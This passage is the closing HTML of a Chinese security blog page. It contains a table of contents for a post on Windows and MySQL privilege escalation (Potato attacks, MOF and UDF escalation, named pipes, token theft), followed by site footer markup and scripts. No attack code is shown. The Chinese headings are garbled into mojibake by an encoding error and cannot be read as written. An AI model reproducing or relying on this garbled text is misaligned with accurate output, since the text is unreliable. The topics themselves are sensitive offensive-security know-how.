toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">5.0.3.</span> <span class="toc-text">å®æ“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%94%A8%E6%88%B7%E4%B8%8D%E5%8F%AF%E5%A7%94%E6%B4%BE%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.4.</span> <span class="toc-text">æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POTATO-%E5%AE%B6%E6%97%8F"><span class="toc-number">6.</span> <span class="toc-text">POTATO å®¶æ—</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hot-potato"><span class="toc-number">6.1.</span> <span class="toc-text">hot potato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">7.</span> <span class="toc-text">MYSQLä¸‹çš„ææƒæŠ€æœ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">MOFææƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">7.2.</span> <span class="toc-text">UDFææƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">7.3.</span> <span class="toc-text">å¯åŠ¨é¡¹ææƒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">å‘½åç®¡é“ææƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">9.</span> <span class="toc-text">ä»¤ç‰Œçªƒå–</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: #0D0101"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By ConsT27</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">æ€€å¿µé‚£ä¸€åˆ¹è€€çœ¼çš„ç«èŠ±</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>